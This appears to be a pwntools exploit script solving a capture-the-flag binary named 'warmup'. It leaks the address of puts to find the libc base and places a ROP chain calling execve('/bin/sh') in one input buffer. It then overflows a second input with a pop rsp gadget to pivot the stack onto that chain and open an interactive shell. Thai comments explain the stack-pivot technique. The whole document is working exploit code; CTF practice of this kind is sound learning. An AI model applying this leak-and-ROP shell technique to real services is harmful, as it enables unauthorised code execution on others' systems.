#!/usr/bin/env python3

from pwn import *

exe = ELF("./warmup_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe
#context.log_level = "DEBUG"
context.terminal = ["xterm", "-e"]
context(os='linux', arch='amd64', log_level='debug')

def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdbscript = """
        b *0x40124f
        b *0x40118e
        c
        """
        #gdb.attach(r,gdbscript=gdbscript)
    else:
        r = remote("addr", 1337)

    return r

def main():
    r = conn()
    leaked_puts = int(r.recv(14),16)
    libc.address = leaked_puts - libc.sym.puts
    log.info(hex(libc.address)) #0x7ffff7dab000
    
    rop_chain = ROP(libc)
    rop_chain.rdi = next(libc.search(b'/bin/sh\x00')) #argument 1
    rop_chain.rsi = 0 #argument 2
    rop_chain.rax = 59 #signal ของ execve ในการใช้ syscall 
    #https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md
    rop_chain.raw(rop_chain.find_gadget(["syscall"])[0])
    r.sendlineafter(b'name>>',rop_chain.chain())
    
    rop_elf = ROP(exe)
    pop_rsp = rop_elf.find_gadget(["pop rsp","ret"])[0]

    # เพราะ ROP มันจะ ret ไปยัง Address ที่อยู่ใน Stack ใช่ป่ะ 
    # เราอยาก Ret ไปที่อื่นเราก็เลยต้องเปลี่ยน RSP ที่เป็น Register ที่ Point ไปที่ Stack address บนสุดครับ
    # ปกติ stack pivot เราจะใช้ในเคสที่ว่า input a ที่เรา exploit ได้เราใส่ความยาว payload ได้จำกัดอ่ะ 
    # แต่บังเอิญเรามี input b อีกที่ เราสามารถใส่ความยาวได้เลย 1000 byte 
    # เราเลย exploit ที่ input a ให้มันไป execute rop ที่ input b ครับ
    # การทำ rop gadget คือการที่เราเล่นกับ instruction ret ถูกไหม ถามว่า ret จริง ๆ แล้วสิ่งที่มันทำคืออะไร มันคือ pop rip ครับ
    # คือมันจะ pop ค่าบนสุดของ stack (ค่าที่ rsp ชี้ไป) มาใส่ rip เลย 
    # การที่เรา pop rsp สิ่งที่เราทำคือ เราจะ set ค่า rsp เป็น address ที่เก็บ input b
    # จากนั้นเมื่อทำการ ret มันจะไปอ่าน rop gadget ใน input b
    # เราจะใส่ rop ไว้ที่ไหนก็ได้ที่เรามีสิทย์เขียน ใน .bss ใน heap stack ก็ได้
    # ขอบคุณคำแนะนำจากพี่ Jusmistic 🙏
            
    payload = b'A'*64 + p64(0) + p64(pop_rsp) + p64(0x404060)
    r.sendlineafter(b'alright>>',payload)

    r.interactive()

if __name__ == "__main__":
    main()
